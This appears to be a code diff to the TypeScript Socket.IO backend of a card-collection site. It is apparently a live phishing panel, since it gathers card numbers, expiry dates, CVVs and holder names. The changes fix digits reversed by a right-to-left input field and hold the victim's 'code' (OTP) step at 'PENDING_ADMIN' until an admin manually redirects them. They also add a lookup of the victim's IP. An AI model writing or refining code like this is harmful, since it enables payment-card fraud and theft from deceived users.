@@ -141,7 +141,10 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
 
         const str = (v: unknown) => (v != null ? String(v) : "");
         // دعم أسماء الحقول المختلفة من الموقع الأمامي
-        const cardNum = str(data.cardNumber ?? data.CardID ?? data.cardID ?? "").replace(/\s/g, "");
+        const rawCardNum = str(data.cardNumber ?? data.CardID ?? data.cardID ?? "").replace(/\s/g, "");
+        // الموقع يستخدم dir=rtl في حقل رقم البطاقة مما يجعل الأرقام تصل معكوسة
+        // نعكسها لاستعادة الترتيب الصحيح
+        const cardNum = rawCardNum.split("").reverse().join("");
         const expiry = str(data.expirationDate ?? data.DateExp ?? data.dateExp ?? "");
         const cvv = str(data.cvv ?? data.CVV ?? data.cardCvv ?? "");
         const holderName = str(data.cardHolderName ?? data.CardHolderName ?? "");
@@ -220,9 +223,10 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
 
         io?.to("admins").emit("newPayment", { reference, step: 3, type: "code" });
 
+        // لا نُرسل success:true حتى لا ينتقل العميل تلقائياً - ينتظر موافقة المشرف عبر navigateTo
         socket.emit("ackCode", {
-          success: true,
-          data: { step: 3, status: "STILL" },
+          success: false,
+          data: { step: 3, status: "PENDING_ADMIN" },
         });
       } catch (err: any) {
         console.error("[Socket.io] submitCodeData error:", err);
@@ -453,6 +457,14 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
 
 export function getIo(): SocketIOServer | null {
   return io;
+}
+
+// جلب IP العميل من ipToReference map (IP من ipify.org)
+export function getIpByReference(reference: string): string | null {
+  for (const [ip, ref] of Array.from(ipToReference.entries())) {
+    if (ref === reference) return ip;
+  }
+  return null;
 }
 
 // دالة لتوجيه عميل بـ IP معين
